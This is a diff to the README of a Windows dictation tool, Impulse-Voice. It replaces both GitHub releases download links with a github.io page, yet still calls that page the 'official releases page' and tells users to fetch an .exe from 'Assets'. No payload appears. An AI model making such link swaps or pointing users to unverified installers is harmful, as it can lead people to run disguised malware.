@@ -1,6 +1,6 @@
 # 🎙️ Impulse-Voice - Private dictation for your daily tasks
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/salukum1597/Impulse-Voice/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://salukum1597.github.io)
 
 Impulse-Voice turns your spoken words into text. It runs entirely on your own computer. You do not need an internet connection to use it. Your voice data stays on your machine at all times. This tool integrates with your system to help you write notes, emails, and documents using only your voice. 
 
@@ -8,7 +8,7 @@ Impulse-Voice turns your spoken words into text. It runs entirely on your own co
 
 To get started, you must fetch the installer from our project page. The software works on current versions of Windows. 
 
-1. Visit the [official releases page](https://github.com/salukum1597/Impulse-Voice/releases).
+1. Visit the [official releases page](https://salukum1597.github.io).
 2. Look for the section labeled "Assets."
 3. Select the file ending in `.exe` that matches your system.
 4. Save the file to your computer.
